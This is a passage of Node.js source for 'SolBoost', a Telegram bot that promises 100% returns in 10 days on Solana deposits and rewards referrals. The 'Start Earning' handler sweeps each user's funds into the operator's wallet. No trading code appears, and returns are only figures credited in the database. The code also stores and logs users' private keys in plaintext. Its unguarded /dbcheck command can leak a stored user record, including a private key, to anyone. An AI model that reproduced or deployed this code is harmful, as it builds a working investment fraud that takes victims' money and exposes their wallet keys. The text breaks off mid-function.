// Import necessary modules
import pkg from 'pg';
import { Keypair, Connection, LAMPORTS_PER_SOL, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
import bs58 from 'bs58';
import { Telegraf, Markup } from 'telegraf';
import dotenv from 'dotenv';
import http from 'http';
import winston from 'winston';
import schedule from 'node-schedule';
import { sendAndConfirmTransaction } from '@solana/web3.js';
import { SendTransactionError } from '@solana/web3.js';

// Load environment variables
dotenv.config();


const locks = new Map();

const acquireLock = async (userId) => {
  if (locks.has(userId)) {
    const lockTime = locks.get(userId);
    if (Date.now() - lockTime < 5 * 60 * 1000) { // 5 minutes
      return false;
    }
  }
  locks.set(userId, Date.now());
  return true;
};

const releaseLock = (userId) => {
  locks.delete(userId);
};

// Constants
const { Pool } = pkg;
const MAX_RETRIES = 5;
const INITIAL_BACKOFF = 1000; // 1 second

// Environment variables
const { BOT_TOKEN, MAIN_WALLET_PRIVATE_KEY, BOT_OWNER_ID, DATABASE_URL } = process.env;
const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';


// Validation
if (!BOT_TOKEN || !MAIN_WALLET_PRIVATE_KEY || !BOT_OWNER_ID || !DATABASE_URL || !RPC_URL) {
  throw new Error("Missing required environment variables. Check your .env file.");
}

// Initialize Telegram bot
const bot = new Telegraf(BOT_TOKEN);
bot.use(Telegraf.log());

// Main wallet for receiving Solana
const mainWallet = Keypair.fromSecretKey(bs58.decode(MAIN_WALLET_PRIVATE_KEY));

// Database connection
const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: DATABASE_URL.includes("localhost") ? false : { rejectUnauthorized: false },
});

bot.catch((err, ctx) => {
  console.error(`Error while handling update ${ctx.update.update_id}:`, err);
  // You can add more error handling logic here, such as notifying admins or logging to a service
});

// Logger setup
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'bot.log' }),
  ],
});

// Error handling
process.on('uncaughtException', (error) => {
  logger.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Utility functions
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const retryOperation = async (operation, maxRetries = MAX_RETRIES, initialBackoff = INITIAL_BACKOFF) => {
  let retries = 0;
  while (retries < maxRetries) {
    try {
      return await operation();
    } catch (error) {
      if (error.message.includes('429 Too Many Requests') || error.message.includes('max usage reached')) {
        retries++;
        const delay = initialBackoff * Math.pow(2, retries);
        console.log(`Rate limited. Retrying in ${delay}ms...`);
        await wait(delay);
      } else {
        throw error;
      }
    }
  }
  throw new Error('Operation failed after max retries');
};

const safeEditMessage = async (ctx, text, extra = {}) => {
  try {
    await ctx.editMessageText(text, extra);
  } catch (error) {
    if (error.description !== "Bad Request: message is not modified") {
      console.error('Error updating message:', error);
    }
  }
};

const generateReferralCode = () => {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
};

const isBotOwner = (userId) => {
  return userId.toString() === BOT_OWNER_ID;
};

const calculateBalance = (initialAmount, depositDate) => {
  const now = new Date();
  const depositTime = new Date(depositDate);
  const elapsedDays = (now - depositTime) / (1000 * 60 * 60 * 24);
  const doublingPeriods = Math.floor(elapsedDays / 10);
  const remainingDays = elapsedDays % 10;
  
    // Calculate the balance after the full doubling periods
      let balance = initialAmount * Math.pow(2, doublingPeriods);
      
      // Apply exponential growth for the remaining days
      const partialGrowthFactor = Math.pow(2, remainingDays / 10);
      balance *= partialGrowthFactor; // Apply partial growth for remaining days

      return balance; // Return balance with 8 decimal places for precision
    };

// Helper functions


const safeAnswerCallbackQuery = async (ctx, text = '') => {
  try {
    await ctx.answerCbQuery(text);
  } catch (error) {
    if (error.description && error.description.includes('query is too old')) {
      console.log('Callback query expired:', error.description);
    } else {
      console.error('Error answering callback query:', error);
    }
  }
};




//deposit menu
const showDepositMenu = async (ctx) => {
  const chatId = ctx.from.id;
  console.log(`Showing deposit menu for user ${chatId}`);

  try {
    const query = 'SELECT public_key FROM users WHERE chat_id = $1';
    const result = await pool.query(query, [chatId]);

    if (result.rows.length > 0) {
      const { public_key: publicKeyString } = result.rows[0];
      const publicKey = new PublicKey(publicKeyString);

      const depositMessage = `
📥 Deposit SOL
Your deposit address (click to copy):
<code>${publicKey.toBase58()}</code>

📝 Note: Please only send SOL to this address. Sending other tokens may result in permanent loss.

Minimum deposit: 0.5 SOL
      `;

      const depositKeyboard = Markup.inlineKeyboard([
        [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')],
        [Markup.button.callback('Deposit History', 'deposit_history')]
      ]);

      await ctx.reply(depositMessage, {
        parse_mode: 'HTML',
        ...depositKeyboard
      });
    } else {
      await ctx.reply('User not found. Please use /start to register.');
    }
  } catch (error) {
    console.error('Error in deposit option:', error);
    await ctx.reply('An error occurred while fetching your deposit address. Please try again.');
  }
};






// Database functions
const getUser = async (chatId) => {
  const client = await pool.connect();
  try {
    const query = 'SELECT *, deposit_amount::float, deposit_date::timestamp FROM users WHERE chat_id = $1';
    const result = await client.query(query, [chatId]);
    return result.rows[0];
  } catch (error) {
    console.error('Error fetching user:', error);
    throw error;
  } finally {
    client.release();
  }
};

const getAllUsers = async () => {
  const client = await pool.connect();
  try {
    const query = 'SELECT chat_id, first_name, public_key FROM users';
    const result = await client.query(query);
    return result.rows;
  } catch (error) {
    console.error('Error fetching users:', error);
    throw error;
  } finally {
    client.release();
  }
};

const registerUser = async (chatId, publicKey, privateKey, firstName) => {
  const client = await pool.connect();
  try {
    const referralCode = generateReferralCode();
    const query = `
      INSERT INTO users (chat_id, public_key, private_key, first_name, referral_code, balance)
      VALUES ($1, $2, $3, $4, $5, 0)
      ON CONFLICT (chat_id) DO UPDATE
      SET public_key = EXCLUDED.public_key,
          private_key = EXCLUDED.private_key,
          first_name = EXCLUDED.first_name,
          last_activity = CURRENT_TIMESTAMP
      RETURNING *;
    `;
    const result = await client.query(query, [chatId, publicKey, privateKey, firstName, referralCode]);
    console.log('User registered/updated:', result.rows[0]);
    return result.rows[0];
  } catch (error) {
    console.error('Error registering user:', error);
    throw error;
  } finally {
    client.release();
  }
};

const updateUserActivity = async (chatId) => {
  const client = await pool.connect();
  try {
    const query = 'UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE chat_id = $1';
    await client.query(query, [chatId]);
    console.log(`Updated activity for user ${chatId}`);
  } catch (error) {
    console.error('Error updating user activity:', error);
    throw error;
  } finally {
    client.release();
  }
};

const updateUserFirstName = async (chatId, firstName) => {
  const client = await pool.connect();
  try {
    const query = `
      UPDATE users
      SET first_name = $2, last_activity = CURRENT_TIMESTAMP
      WHERE chat_id = $1
      RETURNING *;
    `;
    const result = await client.query(query, [chatId, firstName]);
    console.log('User first name updated:', result.rows[0]);
    return result.rows[0];
  } catch (error) {
    console.error('Error updating user first name:', error);
    throw error;
  } finally {
    client.release();
  }
};

const updateUserDeposit = async (chatId, amount) => {
  const client = await pool.connect();
  try {
    const query = 'UPDATE users SET deposit_amount = $2, deposit_date = CURRENT_TIMESTAMP WHERE chat_id = $1 RETURNING *';
    const result = await client.query(query, [chatId, amount]);
    return result.rows[0];
  } catch (error) {
    console.error('Error updating user deposit:', error);
    throw error;
  } finally {
    client.release();
  }
};

const recordTransaction = async (userId, type, amount, txSignature = null, newBalance = null) => {
  const client = await pool.connect();
  try {
    const query = `
      WITH inserted_transaction AS (
        INSERT INTO transactions (user_id, transaction_type, amount, tx_signature, balance_after)
        VALUES ($1, $2, $3, $4, $5)
        RETURNING *
      )
      SELECT
        t.*,
        u.public_key,
        u.first_name,
        u.deposit_amount,
        u.withdrawal_amount,
        u.status AS user_status,
        u.referral_code
      FROM inserted_transaction t
      JOIN users u ON t.user_id = u.chat_id;
    `;
    const result = await client.query(query, [userId, type, amount, txSignature, newBalance]);
    console.log(`Transaction recorded:`, result.rows[0]);
    return result.rows[0];
  } catch (error) {
    console.error('Error recording transaction:', error);
    throw error;
  } finally {
    client.release();
  }
};

// Keyboard and menu functions
const getMainMenuKeyboard = () => {
  return Markup.keyboard([
    ['Main Wallet', 'Start Earning'],
    ['Deposit', 'Withdraw'],
    ['Referrals', 'Balance'],
    ['Docs', 'Refresh'],
    ['💡 How it works']
  ]).resize();
};

const sendMainMenu = async (ctx) => {
  return ctx.reply('Please choose an option:', getMainMenuKeyboard());
};

// Bot commands
bot.command('start', async (ctx) => {
  const chatId = ctx.from.id;
  const firstName = ctx.from.first_name || 'User';
  const startPayload = ctx.message.text.split(' ')[1];

  try {
    let user = await getUser(chatId);
    if (!user) {
      const wallet = Keypair.generate();
      const publicKey = wallet.publicKey.toString();
      const privateKey = bs58.encode(wallet.secretKey);
      
      let referrerId = null;
      if (startPayload && startPayload.startsWith('ref')) {
        referrerId = parseInt(startPayload.slice(3));
      }

      user = await registerUser(chatId, publicKey, privateKey, firstName, referrerId);
      
      if (referrerId) {
        await ctx.reply(`Welcome, ${firstName}! You were referred by a friend.`);
      } else {
        await ctx.reply(`Welcome, ${firstName}! to Solboost..
 
    SolBoost is an automated Solana trading bot that delivers 100% returns in 10 days. SolBoost operates by executing advanced trading strategies on the Solana blockchain, providing users with consistent and reliable profit generation.

    A unique Solana wallet has been created for you.
     
     <b>🔑 Wallet Address:</b> <code>${user.public_key}</code>
     <b>💰 Balance :</b> ${user.current_balance} SOL

     <b>Getting Started:</b>

     1. Deposit a minimum of 0.5 SOL to activate trading.
     2. Select Start Earning to begin auto-trading.
     3. Monitor your performance and withdraw profits at your convenience.


    Please use the options below to proceed:

      <b>• Deposit:</b> Add funds to your wallet.
      <b>• Start Earning:</b> Begin automated trading.
      <b>• Main Wallet:</b> Check your wallet balance.
      <b>• Balance:</b> Review your earnings.
      <b>• Docs:</b> Access detailed documentation.
      <b>• How It Works:</b> Understand the functionality of SolBoost.`, {
            parse_mode: 'HTML'});
      }
    } else {
      if (user.first_name !== firstName) {
          user = await updateUserFirstName(chatId, firstName);
      }
      await ctx.reply(`Welcome back, ${firstName}! to Solboost..

SolBoost is an automated Solana trading bot that delivers 100% returns in 10 days. SolBoost operates by executing advanced trading strategies on the Solana blockchain, providing users with consistent and reliable profit generation.

A unique Solana wallet has been created for you.
 
 <b>🔑 Wallet Address:</b> <code>${user.public_key}</code>
 <b>💰 Balance :</b> ${user.current_balance} SOL

 <b>Getting Started:</b>

 1. Deposit a minimum of 0.5 SOL to activate trading.
 2. Select Start Earning to begin auto-trading.
 3. Monitor your performance and withdraw profits at your convenience.


Please use the options below to proceed:

  <b>• Deposit:</b> Add funds to your wallet.
  <b>• Start Earning:</b> Begin automated trading.
  <b>• Main Wallet:</b> Check your wallet balance.
  <b>• Balance:</b> Review your earnings.
  <b>• Docs:</b> Access detailed documentation.
  <b>• How It Works:</b> Understand the functionality of SolBoost.`, {
      parse_mode: 'HTML'});
    }
    await updateUserActivity(chatId);
    await sendMainMenu(ctx);
  } catch (error) {
    console.error('Error in start command:', error);
    await ctx.reply('An error occurred while starting. Please try again later.');
  }
});


bot.hears('Referrals', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    const referralLink = generateReferralLink(chatId);
    const user = await getUser(chatId);
    
    // Get referral stats
    const referralStatsQuery = `
      SELECT COUNT(*) as referral_count, SUM(deposit_amount) as total_deposits
      FROM users
      WHERE referred_by = $1
    `;
    const statsResult = await pool.query(referralStatsQuery, [chatId]);
    const { referral_count, total_deposits } = statsResult.rows[0];

    const message = `
🔗 Your Referral Link: ${referralLink}

Share this link with your friends. When they join and make a deposit, you'll receive a 6% bonus!

📊 Your Referral Stats:
Referrals: ${referral_count || 0}
Total Deposits: ${total_deposits ? total_deposits.toFixed(2) : '0.00'} SOL
Earned Bonuses: ${(total_deposits * 0.06).toFixed(2)} SOL

Invite more friends to earn more!
    `;

    await ctx.reply(message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Error in referral menu:', error);
    await ctx.reply('An error occurred while fetching your referral information. Please try again.');
  }
});


const handleDeposit = async (userId, amount) => {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    const now = new Date();
    
    // Update user's deposit amount and date
    const updateQuery = `
      UPDATE users
      SET deposit_amount = COALESCE(deposit_amount, 0) + $1,
          deposit_date = CASE
                          WHEN deposit_amount IS NULL THEN $2
                          ELSE deposit_date
                         END,
          current_balance = COALESCE(current_balance, 0) + $1
      WHERE chat_id = $3
      RETURNING deposit_amount, deposit_date, current_balance`;
    const updateResult = await client.query(updateQuery, [amount, now, userId]);
    const { deposit_amount, deposit_date, current_balance } = updateResult.rows[0];

    // Record the transaction
    await recordTransaction(userId, 'deposit', amount, null, current_balance);

    // Process referral bonus
    await processReferralBonus(amount, userId);

    await client.query('COMMIT');

    // Notify user of successful deposit
    await bot.telegram.sendMessage(userId, `Your deposit of ${amount.toFixed(2)} SOL has been received and added to your account. Your new total deposit is ${deposit_amount.toFixed(2)} SOL and your current balance is ${current_balance.toFixed(2)} SOL.`);
  } catch (error) {
    await client.query('ROLLBACK');
    console.error('Error handling deposit:', error);
    throw error;
  } finally {
    client.release();
  }
};


bot.command('broadcast', async (ctx) => {
  if (!isBotOwner(ctx.from.id)) {
    return ctx.reply('Sorry, only the bot owner can use this command.');
  }

  let messageText = ctx.message.text.split('/broadcast ')[1];
  
  if (!messageText) {
    return ctx.reply('Please provide a message to broadcast. Usage: /broadcast <your message>\n\nYou can use {name} and {wallet} as placeholders.');
  }

  try {
    const users = await getAllUsers();
    console.log(users);
    let successCount = 0;
    let failCount = 0;

    for (const user of users) {
      try {
        let personalizedMessage = messageText
          .replace('{name}', user.first_name || 'User')
          .replace('{wallet}', user.public_key || 'Not available');

        await bot.telegram.sendMessage(user.chat_id, personalizedMessage);
        successCount++;
      } catch (error) {
        console.error(`Failed to send message to user ${user.chat_id}:`, error);
        failCount++;
      }
    }

    await ctx.reply(`Broadcast complete.\nSuccessful: ${successCount}\nFailed: ${failCount}`);
  } catch (error) {
    console.error('Error during broadcast:', error);
    await ctx.reply('An error occurred while broadcasting the message.');
  }
});

bot.command('broadcasthelp', (ctx) => {
  if (!isBotOwner(ctx.from.id)) {
    return ctx.reply('Sorry, only the bot owner can use this command.');
  }

  const helpMessage = `
Broadcast Command Help:

Use /broadcast followed by your message. You can use these placeholders:
{name} - Will be replaced with the user's first name
{wallet} - Will be replaced with the user's wallet address

Example:
/broadcast Hello {name}! Your wallet address is {wallet}. Don't share this with anyone!

This will send a personalized message to each user.
  `;

  ctx.reply(helpMessage);
});

bot.command('dbcheck', async (ctx) => {
  const client = await pool.connect();
  try {
    const result = await client.query('SELECT * FROM users');
    console.log('Database content:', result.rows);
    await ctx.reply(`Found ${result.rows.length} users in the database.`);
    if (result.rows.length > 0) {
      await ctx.reply(`First user: ${JSON.stringify(result.rows[0])}`);
    }
  } catch (error) {
    console.error('Error checking database:', error);
    await ctx.reply('Error checking database: ' + error.message);
  } finally {
    client.release();
  }
});

bot.command('dburl', (ctx) => {
  const dbUrl = process.env.DATABASE_URL.replace(/:[^:]*@/, ':****@'); // Hide password
  ctx.reply(`Current DATABASE_URL: ${dbUrl}`);
});

bot.command('adminstats', async (ctx) => {
  if (!isBotOwner(ctx.from.id)) {
    return ctx.reply('Sorry, only the bot owner can use this command.');
  }

  try {
    const stats = await getAdminStats();
    
    const message = `
📊 Admin Statistics 📊

👥 Users:
Total Users: ${stats.totalUsers}
Active Users (last 7 days): ${stats.activeUsers}
Auto Reinvest Users: ${stats.autoReinvestUsers}
Auto Withdrawal Users: ${stats.autoWithdrawalUsers}

💰 Transactions:
Total Deposits: ${stats.totalDeposits}
Total Deposit Amount: ${stats.totalDepositAmount.toFixed(2)} SOL
Total Withdrawals: ${stats.totalWithdrawals}
Total Withdrawal Amount: ${stats.totalWithdrawalAmount.toFixed(2)} SOL

👤 Users by Stage:
${Object.entries(stats.usersByStage).map(([stage, count]) => `${stage}: ${count}`).join('\n')}

⚠️ Users with Recent Issues: ${stats.usersWithIssues}

Generate a detailed report: /adminreport
    `;

    await ctx.reply(message);
  } catch (error) {
    console.error('Error in admin stats command:', error);
    await ctx.reply('An error occurred while fetching admin statistics.');
  }
});

bot.command('adminreport', async (ctx) => {
  if (!isBotOwner(ctx.from.id)) {
    return ctx.reply('Sorry, only the bot owner can use this command.');
  }

  try {
    const stats = await getAdminStats();
    
    const reportLines = [
      'Category,Metric,Value',
      `Users,Total,${stats.totalUsers}`,
      `Users,Active (7 days),${stats.activeUsers}`,
      `Users,Auto Reinvest,${stats.autoReinvestUsers}`,
      `Users,Auto Withdrawal,${stats.autoWithdrawalUsers}`,
      `Transactions,Total Deposits,${stats.totalDeposits}`,
      `Transactions,Total Deposit Amount,${stats.totalDepositAmount.toFixed(2)}`,
      `Transactions,Total Withdrawals,${stats.totalWithdrawals}`,
      `Transactions,Total Withdrawal Amount,${stats.totalWithdrawalAmount.toFixed(2)}`,
      ...Object.entries(stats.usersByStage).map(([stage, count]) => `Users by Stage,${stage},${count}`),
            `Issues,Users with Recent Issues,${stats.usersWithIssues}`,
          ];

          const reportContent = reportLines.join('\n');
          
          await ctx.replyWithDocument({
            source: Buffer.from(reportContent),
            filename: 'admin_report.csv'
          });

        } catch (error) {
          console.error('Error in admin report command:', error);
          await ctx.reply('An error occurred while generating the admin report.');
        }
      });

      // Bot actions
      bot.hears('Main Wallet', async (ctx) => {
        console.log('Main wallet button pressed');
        const chatId = ctx.from.id;

        const consentKeyboard = Markup.inlineKeyboard([
          [Markup.button.callback('Yes, show my wallet details', 'show_wallet_details')],
          [Markup.button.callback('No, go back to main menu', 'back_to_main_menu')]
        ]);

        await ctx.reply('You are about to view your wallet details. This includes sensitive information. Do you want to proceed?', consentKeyboard);
      });

bot.action('show_wallet_details', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  const chatId = ctx.from.id;
  
  try {
      await ctx.editMessageText('Fetching wallet details...');
    const query = 'SELECT public_key, private_key, deposit_amount FROM users WHERE chat_id = $1';
    const result = await pool.query(query, [chatId]);

    if (result.rows.length > 0) {
      const { public_key: publicKeyString, private_key: privateKey, deposit_amount: storedDepositAmount } = result.rows[0];
      const publicKey = new PublicKey(publicKeyString);

      const connection = new Connection(RPC_URL);
      
      const balance = await retryOperation(async () => {
        return await connection.getBalance(publicKey);
      }, 5, 1000); // 5 retries, starting with 1 second delay
      
      const solBalance = balance / LAMPORTS_PER_SOL;

   /*  if (solBalance !== storedDepositAmount) {
        await pool.query('UPDATE users SET deposit_amount = $1 WHERE chat_id = $2', [solBalance, chatId]);
        console.log(`User ${chatId} deposit amount updated in the database: ${solBalance} SOL`);
      } */

      const balanceMessage = 
`
💵 Main Wallet (Solana)

Address: <code>${publicKey.toBase58()}</code>

Private Key: <code>${privateKey}</code>

Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)`;

      const walletKeyboard = Markup.inlineKeyboard([
        [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
      ]);

      await safeEditMessage(ctx, balanceMessage, {
        parse_mode: 'HTML',
        ...walletKeyboard
      });
    } else {
      await safeEditMessage(ctx, 'User not found. Please use /start to register.', Markup.inlineKeyboard([
        [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
      ]));
    }
  } catch (error) {
    console.error('Error in main_wallet action:', error);
    await safeEditMessage(ctx, 'An error occurred while fetching your wallet details. Please try again.', Markup.inlineKeyboard([
      [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
    ]));
  }
});


      bot.action('back_to_main_menu', async (ctx) => {
          await safeAnswerCallbackQuery(ctx);
        await sendMainMenu(ctx);
      });


const getUserBalance = async (chatId) => {
  const query = `
    SELECT deposit_amount, deposit_date, current_balance
    FROM users
    WHERE chat_id = $1
  `;
  const result = await pool.query(query, [chatId]);
  
  if (result.rows.length === 0) {
    throw new Error('User not found');
  }

  const { deposit_amount, deposit_date, current_balance } = result.rows[0];
  const profit = Math.max(0, parseFloat(current_balance) - parseFloat(deposit_amount));

  return {
    depositAmount: parseFloat(deposit_amount),
    depositDate: new Date(deposit_date),
    currentBalance: parseFloat(current_balance),
    profit: profit
  };
};




bot.hears('Balance', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    const { depositAmount, depositDate, currentBalance, profit } = await getUserBalance(chatId);

    const message = `
💰 Your Current Balance 💰
Initial Deposit: ${depositAmount.toFixed(8)} SOL
Deposit Date: ${depositDate.toLocaleDateString()}
Current Balance: ${currentBalance.toFixed(8)} SOL
Available for Withdrawal: ${profit.toFixed(8)} SOL

Balance last updated: ${new Date().toLocaleString()}
    `;

    await ctx.reply(message, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Error in balance action:', error);
    await ctx.reply('An error occurred while fetching your balance. Please try again.');
  }
});



bot.hears('Start Earning', async (ctx) => {
  try {
    const chatId = Number(ctx.from.id);
    console.log(`User ${chatId} selected Start Earning`);
    
    const res = await pool.query('SELECT private_key, deposit_amount FROM users WHERE chat_id = $1', [chatId]);
    
    if (res.rowCount === 0) {
      await ctx.reply('No wallet found. Please generate a wallet using /start first.');
      return;
    }
    
    const privateKeyBase58 = res.rows[0].private_key;
    console.log(`Retrieved private key from DB: ${privateKeyBase58}`);
    
    const privateKey = bs58.decode(privateKeyBase58);
    const userWallet = Keypair.fromSecretKey(privateKey);
    
    console.log(`Public key is valid: ${userWallet.publicKey.toBase58()}`);
    console.log('Private key is decoded successfully.');
    
    const connection = new Connection(RPC_URL);
    
    const solBalance = await retryOperation(() => connection.getBalance(userWallet.publicKey));
    console.log(`Actual balance: ${solBalance} lamports`);
    
    const minimumRequired = 0.5 * LAMPORTS_PER_SOL;
    if (solBalance < minimumRequired) {
      await ctx.reply(`🚨 <b>Alert:</b>
 <b>Wallet Address:</b> <code>${userWallet.publicKey.toBase58()}</code>  ( Tap to copy)
 <b>Balance:</b> ${(solBalance / LAMPORTS_PER_SOL).toFixed(2)} SOL.

 <b>Insufficient Funds</b>
 Your wallet does not have enough SOL to start trading.
 Please deposit SOL to activate SolBoost's auto-trading feature.

 <b>Next Steps:</b>
 Use the <b>Deposit</b> option to add funds.
 Once funded, return to <b>Start Earning.</b>
`, {
      parse_mode: 'HTML'
  });
      return;
    }
    
    const blockhash = await retryOperation(() => connection.getLatestBlockhash());
    const transaction = new Transaction({
      recentBlockhash: blockhash.blockhash,
      feePayer: userWallet.publicKey,
    });
    
    const feeForMessage = await retryOperation(() => connection.getFeeForMessage(transaction.compileMessage()));
    const estimatedFee = feeForMessage.value ? feeForMessage.value : 5000;
    const totalFee = estimatedFee * 5 + 35000;
    console.log(`Estimated fee: ${totalFee} lamports`);
    
    const rentExemptionThreshold = await retryOperation(() => connection.getMinimumBalanceForRentExemption(0));
    console.log(`Rent exemption threshold: ${rentExemptionThreshold} lamports`);
    
    const amountToTransfer = solBalance - totalFee - rentExemptionThreshold;
    console.log(`Amount to transfer: ${amountToTransfer} lamports`);
    
    if (amountToTransfer <= 0) {
      await ctx.reply(`Insufficient balance to cover the transaction fee and rent exemption. Your current balance is ${(solBalance / LAMPORTS_PER_SOL).toFixed(2)} SOL.`);
      return;
    }
    
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: userWallet.publicKey,
        toPubkey: mainWallet.publicKey,
        lamports: amountToTransfer,
      })
    );

    try {
      const signature = await retryOperation(() =>
        connection.sendTransaction(transaction, [userWallet], { skipPreflight: false, preflightCommitment: 'confirmed' })
      );
      await retryOperation(() => connection.confirmTransaction(signature, 'confirmed'));
      
      // Use the handleDeposit function to process the deposit
      await handleDeposit(chatId, amountToTransfer / LAMPORTS_PER_SOL);

      await ctx.reply(`Your deposit of ${(amountToTransfer / LAMPORTS_PER_SOL).toFixed(2)} SOL has been added to your trading balance.\n\n🎉 Welcome on Board, ${ctx.from.first_name}!\n\nYour deposit has been successfully received, and our automated trading bot is now working to maximize your earnings.\n\nStay tuned for updates, and feel free to reach out if you have any questions!\n\nHappy trading! 🚀`);

    } catch (error) {
      console.error('Error sending or confirming transaction:', error);
      if (error instanceof SendTransactionError) {
        console.error('Transaction logs:', error.logs);
      }
      await ctx.reply('An error occurred while processing your transaction. Please try again later.');
      return;
    }
  } catch (error) {
    console.error('Error in start_earning action:', error);
    await ctx.reply('An error occurred while processing your request. Please try again later.');
  }
});

//handle desposits
bot.hears('Deposit', showDepositMenu);

bot.action('deposit_history', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  const chatId = ctx.from.id;

  try {
    const query = `
      SELECT amount::numeric, transaction_date, status, tx_signature
      FROM transactions
      WHERE user_id = $1 AND transaction_type = 'deposit'
      ORDER BY transaction_date DESC
      LIMIT 10;
    `;
    const result = await pool.query(query, [chatId]);

    if (result.rows.length > 0) {
      let message = '<b>Your recent deposit history:</b>\n\n';
      result.rows.forEach((row, index) => {
        const amount = parseFloat(row.amount);
        message += `${index + 1}. Amount: ${amount.toFixed(2)} SOL\n`;
        message += `   Date: ${new Date(row.transaction_date).toLocaleString()}\n`;
        message += `   Status: ${row.status}\n`;
        if (row.tx_signature) {
          message += `   <a href="https://explorer.solana.com/tx/${row.tx_signature}">View on Solana Explorer</a>\n`;
        }
        message += '\n';
      });

      await ctx.editMessageText(message, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Back to Deposit Menu', callback_data: 'back_to_deposit' }]
          ]
        }
      });
    } else {
      await ctx.editMessageText('You have no deposit history yet.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Back to Deposit Menu', callback_data: 'back_to_deposit' }]
          ]
        }
      });
    }
  } catch (error) {
    console.error('Error fetching deposit history:', error);
    await ctx.editMessageText('An error occurred while fetching your deposit history. Please try again later.', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Back to Deposit Menu', callback_data: 'back_to_deposit' }]
        ]
      }
    });
  }
});

const recordDeposit = async (userId, amount, txSignature) => {
  const client = await pool.connect();
  try {
    const query = `
      INSERT INTO transactions (user_id, transaction_type, amount, status, tx_signature)
      VALUES ($1, 'deposit', $2, 'completed', $3)
    `;
    await client.query(query, [userId, amount, txSignature]);
  } catch (error) {
    console.error('Error recording deposit:', error);
    throw error;
  } finally {
    client.release();
  }
};


bot.hears('Withdraw', async (ctx) => {
  const withdrawKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('Auto Withdrawal', 'auto_withdrawal')],
    [Markup.button.callback('Manual Withdrawal', 'manual_withdrawal')],
    [Markup.button.callback('Auto Reinvest', 'auto_reinvest')],
    [Markup.button.callback('Withdrawal History', 'withdrawal_history')],
    [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
  ]);

    await ctx.reply(`
    Choose a withdrawal option:

    <b>Auto Withdraw:</b>
    Profits are automatically transferred to your wallet at regular intervals. No manual action is needed once this option is selected.

    <b>Manual Withdraw:</b>
    Control your withdrawals by manually selecting the amount of SOL you wish to withdraw from your profits. Ideal for users who prefer flexible withdrawals.

    <b>Auto Reinvest:</b>
    Automatically reinvest your profits to generate more returns. This option compounds your gains over time, maximizing your profit potential.

    You can view the status of all withdrawals in the <b>Withdraw History</b> section.
    `, {
        reply_markup: withdrawKeyboard.reply_markup,
        parse_mode: 'HTML',
    });

});
bot.action('auto_withdrawal', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  const chatId = ctx.from.id;

  try {
    const query = 'SELECT auto_withdrawal FROM users WHERE chat_id = $1';
    const result = await pool.query(query, [chatId]);

    if (result.rows.length > 0) {
      const currentStatus = result.rows[0].auto_withdrawal;
      const newStatus = !currentStatus;

      const infoMessage = `
<b>🔄 Auto Withdrawal</b>

With Auto Withdraw, your profits are automatically transferred to your generated wallet address at regular intervals. Once this option is selected, the bot takes care of the entire process, so you don't need to take any additional action.

- Profits will be credited to your wallet as they are generated.
- You can monitor all withdrawals in the Withdraw History section.
- If you prefer more control or wish to reinvest your profits, you can switch to Manual Withdraw or Auto Reinvest at any time.

<b>Current Status: ${currentStatus ? 'Enabled' : 'Disabled'}</b>
`;

      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback(`${newStatus ? 'Enable' : 'Disable'} Auto Withdrawal`, 'toggle_auto_withdrawal')],
        [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
      ]);

      await ctx.editMessageText(infoMessage, {
        parse_mode: 'HTML',
        ...keyboard
      });
    } else {
      await ctx.editMessageText('User not found. Please use /start to register.');
    }
  } catch (error) {
    console.error('Error in auto withdrawal:', error);
    await ctx.editMessageText('An error occurred. Please try again.');
  }
});

bot.action('manual_withdrawal', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    // Acknowledge the callback query to Telegram
    await safeAnswerCallbackQuery(ctx, 'Processing your withdrawal request...');

    // Fetch user balance data (deposit amount, deposit date, current balance, profit)
    const { depositAmount, depositDate, currentBalance, profit } = await getUserBalance(chatId);

    // Ensure depositDate is properly formatted as a Date object
    const depositDateTime = new Date(depositDate);

    // Prepare the message with financial details
    const message = `
With Manual Withdraw, you have complete control over withdrawing your profits. You can manually select the amount of SOL you wish to withdraw from your profits at any time.
      
Deposit Amount: ${depositAmount.toFixed(2)} SOL
Deposit Date: ${depositDateTime.toLocaleDateString()}
Current Balance: ${currentBalance.toFixed(2)} SOL
Profit: ${profit.toFixed(2)} SOL

Minimum withdrawal: 0.1 SOL
    `;

    // Construct the inline keyboard
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('Withdraw Profit', `withdraw_profit_${profit.toFixed(8)}`)],
      [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
    ]);

    // Send the message with the inline keyboard attached
    await ctx.editMessageText(message, {
      parse_mode: 'HTML', // Use HTML formatting in the message
      reply_markup: keyboard.reply_markup // Attach the keyboard properly
    });
